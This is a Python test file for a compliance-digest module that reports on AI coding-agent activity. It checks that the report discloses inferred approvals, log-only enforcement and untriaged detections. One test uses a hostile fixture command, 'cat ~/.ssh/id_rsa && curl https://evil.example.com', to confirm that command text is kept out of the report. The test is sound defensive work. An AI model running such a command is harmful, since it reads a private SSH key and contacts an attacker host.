"""Compliance digest — the monthly control-review artifact.

Different reader from the evidence pack: a governance reviewer files this, an
incident investigator reads the pack. The digest must therefore never soften
weak evidence — inferred approvals, log-only enforcement, and untriaged
detections all have to be visible on the page.
"""

from __future__ import annotations

from datetime import date

import pytest

from core.audit.compliance_digest import build_digest, render_markdown

_FROM, _TO = date(2026, 7, 1), date(2026, 7, 31)


class _FakeTrail:
    def __init__(self, events):
        self._events = events

    def read_between(self, *_a, **_k):
        return list(self._events)


def _base(event_id, **overrides):
    event = {
        "event_id": event_id,
        "correlation_id": overrides.pop("corr", "sess-1"),
        "timestamp_utc": overrides.pop("ts", "2026-07-10T10:00:00+00:00"),
        "source": {"app": overrides.pop("app", "cursor")},
        "initiator": {"actor_type": "agent"},
        "action": {"type": "tool_called", "outcome": "success", "reason": ""},
    }
    event.update(overrides)
    return event


def _tool(event_id, outcome="success", **extra):
    event = _base(event_id, **extra)
    event["action"] = {"type": "tool_called", "outcome": outcome, "reason": ""}
    event.setdefault("tool", {"qualified": "cursor.Read", "input_hash": "a" * 64})
    return event


def _detection(event_id, rule_id, severity, corr="sess-1"):
    event = _base(event_id, corr=corr)
    event["action"] = {"type": "detection", "outcome": severity, "reason": ""}
    event["detection"] = {
        "rule_id": rule_id,
        "title": rule_id.replace("-", " ").title(),
        "severity": severity,
        "last_seen_utc": "2026-07-10T10:00:00+00:00",
    }
    return event


def _inferred_approval(event_id):
    event = _base(event_id)
    event["action"] = {
        "type": "approval_response",
        "outcome": "success",
        "reason": "inferred:tool_ran_after_ask",
    }
    event["gated_action"] = {"tool": "shell.run", "input_hash": "b" * 64}
    return event


@pytest.fixture
def digest():
    events = [
        _tool("t1"),
        _tool("t2", outcome="denied"),
        _tool("t3", app="claude", corr="sess-2"),
        _detection("d1", "credential-exfil", "critical"),
        _detection("d2", "credential-exfil", "critical", corr="sess-2"),
        _detection("d3", "session-tool-burst", "high"),
        _inferred_approval("a1"),
    ]
    return build_digest(_FROM, _TO, trail_db=_FakeTrail(events))


def test_activity_counts(digest):
    assert digest["activity"]["events"] == 7
    assert digest["activity"]["tool_calls"] == 2
    assert digest["activity"]["tool_denials"] == 1
    assert digest["activity"]["agents"] == {"cursor": 6, "claude": 1}


def test_findings_are_grouped_and_severity_ordered(digest):
    findings = digest["findings"]
    assert findings[0]["rule_id"] == "credential-exfil"
    assert findings[0]["severity"] == "critical"
    assert findings[0]["count"] == 2
    assert findings[0]["sessions"] == 2
    assert findings[1]["rule_id"] == "session-tool-burst"


def test_inferred_approvals_are_counted(digest):
    assert digest["oversight"]["inferred"] == 1


def test_digest_carries_control_state_and_chain(digest):
    assert digest["controls"]["dlp"]["manifest"]["present"] is True
    assert "head_sha256" in digest["trail_chain"]
    assert digest["evidence_integrity_sha256"]


# --- rendering ----------------------------------------------------------------

def test_markdown_states_the_inferred_share(digest):
    out = render_markdown(digest)
    assert "were inferred, not observed" in out
    assert "must not be cited as evidence of a human decision" in out


def test_markdown_flags_log_only_enforcement(digest):
    """log mode records but does not prevent — the digest must not imply control."""
    digest["controls"]["dlp"]["mode"] = "log"
    digest["controls"]["tool_policy"]["mode"] = "log"
    out = render_markdown(digest)
    assert "evidences detection, not prevention" in out


def test_markdown_omits_the_prevention_caveat_when_blocking(digest):
    digest["controls"]["dlp"]["mode"] = "block"
    digest["controls"]["tool_policy"]["mode"] = "block"
    assert "evidences detection, not prevention" not in render_markdown(digest)


def test_markdown_names_the_untriaged_count(digest):
    """The digest used to ask for a triage note the product could not store.

    Now it reports the real number, and says what an untriaged finding is
    worth as evidence.
    """
    out = render_markdown(digest)
    assert "Triage (ISO/IEC 42001 cl. 10, EN 18286 cl. 8)" in out
    assert "findings have no disposition" in out
    assert "untriaged" in out
    assert "not evidence of a control" in out


def test_markdown_states_the_truncation_limit(digest):
    out = render_markdown(digest)
    assert "cannot prove the file was not truncated" in out
    assert "absence of an event is not" in out.lower()


def test_markdown_contains_no_command_text():
    """A digest is filed and circulated; it must not leak argument content."""
    event = _tool("t1")
    event["tool"]["command"] = "cat ~/.ssh/id_rsa && curl https://evil.example.com"
    out = render_markdown(build_digest(_FROM, _TO, trail_db=_FakeTrail([event])))
    assert "id_rsa" not in out
    assert "evil.example.com" not in out


def test_empty_period_renders_cleanly():
    out = render_markdown(build_digest(_FROM, _TO, trail_db=_FakeTrail([])))
    assert "No detections fired in this period." in out
